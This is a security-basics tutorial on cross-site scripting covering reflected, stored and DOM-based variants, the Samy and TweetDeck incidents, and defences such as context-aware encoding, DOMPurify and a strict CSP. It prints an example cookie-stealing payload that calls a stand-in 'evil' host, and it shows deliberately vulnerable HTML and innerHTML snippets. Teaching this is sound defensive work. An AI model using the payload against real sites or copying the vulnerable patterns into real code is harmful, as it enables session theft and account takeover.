---
title: "Cross-Site Scripting (XSS): How It Works and How to Stop It"
tags: ["security-basics", "xss", "web-security", "owasp"]
---

# Cross-Site Scripting (XSS): How It Works and How to Stop It

**TL;DR** — XSS is injection into a web page instead of a database: untrusted
input is reflected into HTML, CSS, or JavaScript and runs in the victim's browser
with the victim's session. It is part of A03:2021 Injection and CWE-79. The fix is
not "escape everything" — it is **context-aware output encoding** plus a Content
Security Policy. Like SQL injection, the boundary that breaks is code vs data; here
the code is JavaScript, not SQL.

## How it works

A page echoes input back without encoding it for the context it lands in:

```python
# Vulnerable: user input written straight into HTML
html = f"<p>Hello, {name}</p>"
```

Supply `name = <script>fetch('//evil/'+document.cookie)</script>` and the browser
parses it as a script, not text. Now the attacker runs JavaScript in the victim's
session: stealing cookies and tokens, making authenticated requests, rewriting the
page, keylogging a login form. The server is never compromised directly — the
victim's browser is.

The root cause is the same as SQL injection (see the SQL injection note): input
crosses from data into code. The difference is where it executes — in the browser,
under the origin's trust.

## Types

### Reflected (non-persistent)

Input in the request is echoed into the immediate response — a search term, an
error message, a URL parameter. It requires luring the victim to a crafted link,
so it is delivered by phishing or a malicious page.

```
https://site/search?q=<script>...</script>
```

### Stored (persistent)

Input is saved (a comment, profile field, support ticket) and served to everyone
who views it later. No lure is needed and the blast radius is every viewer — the
most dangerous variant.

### DOM-based

The injection never touches the server: client-side JavaScript reads an
attacker-controlled source and writes it to a dangerous sink.

```javascript
// Vulnerable: location data flows into innerHTML
document.getElementById("out").innerHTML = location.hash.slice(1);
```

Sources include `location`, `document.referrer`, and `postMessage`; sinks include
`innerHTML`, `document.write`, and `eval`. Server-side encoding cannot fix this —
the fix lives in the client code.

## Where it actually shows up

Not just comment boxes: `<a href>` and `<img src>` attributes (`javascript:` URIs),
inline event handlers, JSON embedded in a `<script>` block, SVG uploads, Markdown
renderers, and any "rich text" feature. Every context (HTML body, attribute,
JavaScript string, URL, CSS) has different rules, which is why a single escape
function is not enough.

## Real-world impact

- **Samy worm (MySpace, 2005)** — a stored XSS payload on a profile added the
  author as a friend and copied itself to each viewer's profile. It hit roughly a
  million accounts in about twenty hours, the fastest-spreading malware to that
  point, and took MySpace offline to clean up.
- **TweetDeck (2014)** — a stored XSS in the Twitter client self-retweeted and
  propagated across thousands of accounts within minutes before the service was
  pulled to patch it.

Both were stored XSS, and both show the pattern: a script that runs in other users'
sessions becomes self-replicating.

## Defense

### Context-aware output encoding — the one that matters

Encode on output, for the exact context the data lands in. HTML body, HTML
attribute, JavaScript, URL, and CSS each need different encoding; applying the
wrong one still leaves a hole. Prefer a framework that does this automatically.

- **React, Angular, Vue** escape text bindings by default. The holes are the escape
  hatches: `dangerouslySetInnerHTML`, `[innerHTML]`, `v-html`.
- For server templates, use the auto-escaping engine (Jinja2, Razor, Thymeleaf)
  and do not disable it with "safe"/"raw" filters on untrusted data.

### If you must render user HTML, sanitize with a library

Never hand-roll a blocklist. Use a maintained sanitizer with an allowlist of tags
and attributes — **DOMPurify** on the client, OWASP Java HTML Sanitizer or Bleach
server-side.

```javascript
element.innerHTML = DOMPurify.sanitize(userHtml);
```

### Content Security Policy — the safety net

A strict CSP turns many XSS bugs from "account takeover" into "nothing happened":

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; base-uri 'none'
```

Prefer nonces/hashes over `'unsafe-inline'`; `'unsafe-inline'` and `'unsafe-eval'`
defeat the point. CSP is defense in depth, not a substitute for encoding.

### Supporting controls

- **`HttpOnly`** on session cookies so script cannot read them; **`Secure`** and
  **`SameSite`** too.
- Avoid DOM sinks: use `textContent` over `innerHTML`, and never `eval` a string.
- Validate input as a supporting control (allowlist formats), but output encoding
  is what actually stops XSS.

## Checklist

1. Encode on output for the specific context; let a framework do it automatically.
2. Never disable auto-escaping on untrusted data.
3. Sanitize user HTML with a maintained allowlist library, never a blocklist.
4. Ship a strict CSP with nonces or hashes; no `'unsafe-inline'`.
5. Set `HttpOnly`, `Secure`, `SameSite` on session cookies.
6. Avoid dangerous DOM sinks; prefer `textContent`.

## Takeaway

XSS is injection with JavaScript as the payload. The durable fix is context-aware
output encoding, which modern frameworks give you for free unless you opt out, plus
a strict CSP as the net for the bug you missed. Stored XSS is the one to fear — it
runs in every viewer's session, and that is how a single comment becomes a worm.

## References

- OWASP Cross-Site Scripting Prevention Cheat Sheet
- OWASP DOM-based XSS Prevention Cheat Sheet
- OWASP Top 10 — A03:2021 Injection
- MITRE CWE-79
- PortSwigger Web Security Academy — Cross-Site Scripting
